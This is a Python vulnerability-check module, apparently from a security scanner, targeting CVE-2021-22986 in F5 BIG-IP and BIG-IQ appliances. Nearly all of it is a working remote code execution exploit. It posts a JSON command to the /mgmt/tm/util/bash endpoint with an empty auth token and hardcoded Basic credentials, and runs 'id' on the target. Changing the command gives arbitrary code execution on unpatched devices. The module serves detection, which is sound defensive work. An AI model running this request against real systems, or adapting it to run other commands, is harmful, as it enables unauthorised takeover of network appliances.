#!/usr/bin/env python3

from app.lib.common import get_useragent
from app.lib.request import request

class CVE_2021_22986_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2021-22986漏洞',
            'description': 'CVE-2021-22986漏洞可执行任意命令, 受影响范围为: F5 BIG-IQ 6.0.0-6.1.0、7.0.0-7.0.0.1、7.1.0-7.1.0.2, F5 BIG-IP 12.1.0-12.1.5.2、13.1.0-13.1.3.5、14.1.0-14.1.3.1、15.1.0-15.1.2、16.0.0-16.0.1',
            'date': '2021-03-10',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            "User-Agent": get_useragent(),
            'Content-Type': 'application/json',
            'X-F5-Auth-Token': '',
            'Authorization': 'Basic YWRtaW46QVNhc1M='
        }

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return True or False
        """
        
        data = {'command': "run",'utilCmdArgs':"-c id"}
        try:
            req = await request.post(self.url + '/mgmt/tm/util/bash', headers = self.headers, json = data)
            if req.status == 200 and 'commandResult' in await req.text():
                return True
            
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    CVE_2021_22986 = CVE_2021_22986_BaseVerify('https://127.0.0.1:443')
